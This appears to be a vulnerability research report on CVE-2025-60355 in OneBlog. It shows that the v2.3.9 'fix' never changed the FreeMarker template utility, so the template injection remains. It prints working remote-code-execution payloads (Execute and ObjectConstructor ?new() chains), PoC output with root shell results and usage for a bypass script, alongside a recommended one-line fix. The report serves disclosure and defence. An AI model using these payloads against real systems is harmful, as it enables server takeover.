# Bypass Analysis: CVE-2025-60355

## Executive Summary

**BYPASS RESULT: SUCCESSFUL — The fix in OneBlog v2.3.9 is a complete NO-OP.**

The "fix" commit (`ac1c801f06a595dab6d3a9c26d4a130b0ca5fac2`, labeled ":bookmark: 发布 2.3.9") does **NOT** address the FreeMarker SSTI vulnerability. The vulnerable file `FreeMarkerUtil.java` was **NEVER modified** between v2.3.8 and v2.3.9. The original CVE payload and multiple alternative payloads all work identically on the "patched" version.

This finding means that **OneBlog 2.3.9 (and all versions up to HEAD) remain fully vulnerable to CVE-2025-60355**. The CVE advisory's claim that versions "before 2.3.9" are vulnerable is misleading — v2.3.9 is equally vulnerable.

---

## Bypass Hypothesis

### What we expected to find
The Analysis agent flagged the fix as potentially incomplete. Upon detailed review, we found the fix is not merely incomplete — it is **entirely absent**. The fix commit `ac1c801` contains:

- Version number bumps (2.3.8 → 2.3.9) in all `pom.xml` files
- Article look-count table refactoring (`BizArticleLookServiceImpl.java`, `BizArticleServiceImpl.java`)
- WangEditor JavaScript assets (CSS/JS files)
- WebSocket configuration changes (enable/disable toggle)
- SQL schema updates for the `article_look` table
- Log path and format changes
- Docker build scripts updates
- Sitemap pagination increase (500 → 2000 articles)

**Critically missing**: Any modification to `FreeMarkerUtil.java` or any security-related change.

### Why the fix fails
The vulnerability exists because `FreeMarkerUtil.template2String()` creates a FreeMarker `Configuration` object without setting a `TemplateClassResolver`:

```java
// blog-core/src/main/java/com/zyd/blog/util/FreeMarkerUtil.java lines 77-79
Configuration cfg = new Configuration(Configuration.VERSION_2_3_22);
cfg.setNumberFormat("#");
// MISSING: cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
t = new Template("", new StringReader(templateContent), cfg);
```

This code is **byte-for-byte identical** in v2.3.8, v2.3.9, and HEAD. We verified this with:
```
git diff 8669276..ac1c801 -- blog-core/src/main/java/com/zyd/blog/util/FreeMarkerUtil.java
# (empty — no changes)

git log --all --oneline -- blog-core/src/main/java/com/zyd/blog/util/FreeMarkerUtil.java
# Only ancient commits shown — no post-v2.3.8 modification
```

---

## Bypass Method

### Technique: No bypass needed — the fix is a no-op

Since the vulnerable code was never modified, the "bypass" is trivially achieved by using the exact same payloads from the original CVE. However, we tested multiple vectors to comprehensively demonstrate the scope:

| Vector | Payload Class | Trigger Endpoint | Template | Result |
|--------|--------------|-----------------|----------|--------|
| V1 | `freemarker.template.utility.Execute` via `?new()` | GET /robots.txt | TM_ROBOTS (id=4) | **RCE CONFIRMED** |
| V2 | `freemarker.template.utility.ObjectConstructor` via `?new()` | GET /robots.txt | TM_ROBOTS (id=4) | **RCE CONFIRMED** |
| V3 | `freemarker.template.utility.Execute` via `?new()` | GET /sitemap.xml | TM_SITEMAP_XML (id=1) | **RCE CONFIRMED** |
| V4 | File write via `Execute` (`touch /tmp/pwned_v239`) | GET /robots.txt | TM_ROBOTS (id=4) | **FILE CREATED** |

### V1: Original CVE Payload (Execute ?new())
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```
**Output on v2.3.9**: `uid=0(root) gid=0(root) groups=0(root)`

### V2: Alternative RCE Class (ObjectConstructor ?new())
```
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb=oc("java.lang.ProcessBuilder", ["sh","-c","id"])>
<#assign proc=pb.start()>
<#assign is=proc.inputStream>
<#assign reader=oc("java.io.InputStreamReader", is)>
<#assign br=oc("java.io.BufferedReader", reader)>
${br.readLine()}
```
**Output on v2.3.9**: `uid=0(root) gid=0(root) groups=0(root)`

### V3: Alternative Trigger Endpoint (sitemap.xml)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/hostname")}
```
Injected into TM_SITEMAP_XML (id=1), triggered via GET /sitemap.xml.
**Output on v2.3.9**: `cve-60355-web` (container hostname)

### V4: File Write Proof
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("touch /tmp/pwned_v239 && echo BYPASS_CONFIRMED")}
```
**Verification**: `docker exec cve-60355-patched-web ls -la /tmp/pwned_v239` → `-rw-r--r-- 1 root root 0 Feb 27 13:03 /tmp/pwned_v239`

---

## Bypass Script

- **Location**: `poc/bypass_poc.py`
- **Language**: Python 3 (stdlib only)
- **Usage**: `python3 bypass_poc.py <admin_host> <admin_port> <web_host> <web_port>`

The script tests all 4 vectors sequentially against the target, with automatic template backup/restore.

---

## Test Results

### Environment
- **Patched Container**: OneBlog v2.3.9 (built from commit `ac1c801`)
- **Container Image**: `cve-60355-patched-admin` / `cve-60355-patched-web`
- **Base Image**: `eclipse-temurin:8-jre-jammy`
- **Version Verified**: `blog-admin` JAR contains `version=2.3.9` in pom.properties

### Full Bypass Output

```
==============================================================================
  CVE-2025-60355 BYPASS PoC: OneBlog 2.3.9 (PATCHED) — Fix is a NO-OP
  Target: OneBlog 2.3.9 (commit ac1c801, released 2025-03-16)
  CVSS: 9.8 CRITICAL | CWE-1336 (Template Injection)
  Finding: FreeMarkerUtil.java was NEVER modified in v2.3.9
==============================================================================

[*] Target Configuration (PATCHED v2.3.9):
    Admin:   http://172.21.0.5:8085 (injection point)
    Web:     http://172.21.0.4:8443 (trigger point)

[*] Authenticating to blog-admin at 172.21.0.5:8085
    [+] Authentication successful! (HTTP 200)

  BYPASS VECTOR: V1: Execute ?new() on /robots.txt (ORIGINAL CVE PAYLOAD)
    [+] Injection successful
    [+] RCE OUTPUT DETECTED!
    │ uid=0(root) gid=0(root) groups=0(root)
    [✓] BYPASS SUCCESSFUL — v2.3.9 is STILL VULNERABLE!

  BYPASS VECTOR: V2: ObjectConstructor ?new() on /robots.txt (ALT RCE CLASS)
    [+] Injection successful
    [+] RCE OUTPUT DETECTED!
    │ uid=0(root) gid=0(root) groups=0(root)
    [✓] BYPASS SUCCESSFUL — v2.3.9 is STILL VULNERABLE!

  BYPASS VECTOR: V3: Execute ?new() on /sitemap.xml (ALT ENDPOINT)
    [+] Injection successful
    │ cve-60355-web
    [✓] BYPASS SUCCESSFUL — v2.3.9 is STILL VULNERABLE!

  BYPASS VECTOR: V4: Execute with file write proof (touch /tmp/pwned_v239)
    [+] Injection successful
    File /tmp/pwned_v239 confirmed created in patched container

  BYPASS TEST RESULTS SUMMARY — OneBlog v2.3.9 (PATCHED)
  [✓ BYPASS] V1: Execute ?new() on /robots.txt (ORIGINAL CVE PAYLOAD)
  [✓ BYPASS] V2: ObjectConstructor ?new() on /robots.txt (ALT RCE CLASS)
  [✓ BYPASS] V3: Execute ?new() on /sitemap.xml (ALT ENDPOINT)
  [✓ BYPASS] V4: Execute with file write proof (canary file created)

  CRITICAL: 4/4 bypass vectors SUCCEEDED on v2.3.9 (PATCHED)
  The fix in commit ac1c801 is a NO-OP — the vulnerability persists!
==============================================================================
```

### Original PoC on Patched Container (Comparison)
The original `poc.py` (designed for v2.3.8) was also run against the patched v2.3.9 container:

```
$ python3 poc.py 172.21.0.5 8085 172.21.0.4 8443 id

  [✓] EXPLOIT SUCCESSFUL — Remote Code Execution confirmed!
  [✓] Command output: uid=0(root) gid=0(root) groups=0(root)
```

The original PoC works **identically** on v2.3.9 — no modification needed.

---

## Severity Assessment

### CRITICAL — The "fix" provides zero protection

This is not a partial bypass or an edge-case exploit. The fix commit does not contain any security-related changes whatsoever. The vulnerability is **100% present and exploitable** in the "patched" version with the exact same techniques, the exact same payloads, and the exact same impact.

### Why This Is Significant

1. **False sense of security**: Users upgrading from 2.3.8 to 2.3.9 based on the CVE advisory would believe they are protected when they are not.

2. **CVE advisory is misleading**: The GHSA and NVD advisory for CVE-2025-60355 states that versions "before 2.3.9" are affected, implying 2.3.9 is safe. This is factually incorrect.

3. **All versions remain vulnerable**: Since `FreeMarkerUtil.java` has never been modified in the entire repository history (beyond formatting changes), **every version of OneBlog ever released is vulnerable to this SSTI**, including the latest HEAD commit (`e0a0cc8`).

4. **Multiple attack surfaces**: Not only `/robots.txt` but also `/sitemap.xml`, `/sitemap.txt`, `/sitemap.html`, and mail template rendering (TM_LINKS, TM_COMMENT_*, etc.) all use the same vulnerable code path.

### CVSS Score (Unchanged)
- **CVSS 3.1**: 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- The CVSS score remains the same because the vulnerability is completely unmitigated.

---

## Recommended Fix

The proper fix requires a single line addition in `FreeMarkerUtil.java`:

```java
// blog-core/src/main/java/com/zyd/blog/util/FreeMarkerUtil.java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_22);
cfg.setNumberFormat("#");
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);  // ADD THIS LINE
t = new Template("", new StringReader(templateContent), cfg);
```

The `ALLOWS_NOTHING_RESOLVER` prevents the `?new()` built-in from instantiating ANY classes, which blocks:
- `freemarker.template.utility.Execute` (OS command execution)
- `freemarker.template.utility.ObjectConstructor` (arbitrary object instantiation)
- `freemarker.template.utility.JndiLookup` (JNDI injection)
- Any other `TemplateModel` implementation

Additionally, for defense in depth:
```java
cfg.setAPIBuiltinEnabled(false);  // Prevent ?api built-in usage
```

### Additional Recommendations
1. **Input validation on template edit**: Add server-side validation to reject templates containing `?new()`, `?api`, or other dangerous FreeMarker built-ins.
2. **Template sandbox**: Consider using FreeMarker's sandbox mode with restricted tag/directive allowlists.
3. **Principle of least privilege**: The blog-web container should not run as root (uid=0).
4. **Default credential rotation**: Force password change on first login.

---

## Does This Constitute a New Vulnerability?

**No** — this is the same CVE-2025-60355 vulnerability. The finding is that the claimed fix is non-existent, meaning the CVE should be updated to reflect that v2.3.9 (and all subsequent versions) remain vulnerable.

This should be reported as:
1. **CVE advisory correction**: Update GHSA-q7cx-22m3-64gr and NVD to indicate that v2.3.9 is also vulnerable, and that NO fixed version exists.
2. **Vendor notification**: Notify the OneBlog maintainer (zhangyd-c) that the vulnerability remains unpatched.
3. **Potential new CVE**: If the vendor disputes the original fix status, a new CVE may be warranted to track the fact that v2.3.9 is still vulnerable.

---

## Confidence Level

**100% — Absolute confidence that the fix is non-existent.**

This conclusion is based on:
1. **Source code analysis**: `git diff` between v2.3.8 and v2.3.9 shows zero changes to `FreeMarkerUtil.java`
2. **Commit history**: `git log` for `FreeMarkerUtil.java` shows no security-relevant modifications ever
3. **JAR verification**: Patched container confirmed running v2.3.9 (`version=2.3.9` in pom.properties)
4. **Empirical testing**: 4 distinct bypass vectors all succeeded on the "patched" container
5. **Original PoC validation**: The unmodified original PoC works identically on both v2.3.8 and v2.3.9

---

## Lab Artifacts

| File | Purpose |
|------|---------|
| `poc/bypass_poc.py` | Multi-vector bypass PoC script |
| `docker-compose.patched.yml` | Patched (v2.3.9) lab orchestration |
| `lab-patched/Dockerfile.admin-patched` | Patched admin container |
| `lab-patched/Dockerfile.web-patched` | Patched web container |
| `lab-patched/blog-admin.jar` | v2.3.9 admin JAR (59MB) |
| `lab-patched/blog-web.jar` | v2.3.9 web JAR (59MB) |

### Running the Patched Lab
```bash
# Start patched lab
docker compose -f docker-compose.patched.yml up -d

# Wait ~30s for Spring Boot startup, then run bypass
ADMIN_IP=$(docker inspect cve-60355-patched-admin --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
WEB_IP=$(docker inspect cve-60355-patched-web --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
python3 poc/bypass_poc.py $ADMIN_IP 8085 $WEB_IP 8443

# Stop patched lab
docker compose -f docker-compose.patched.yml down -v
```
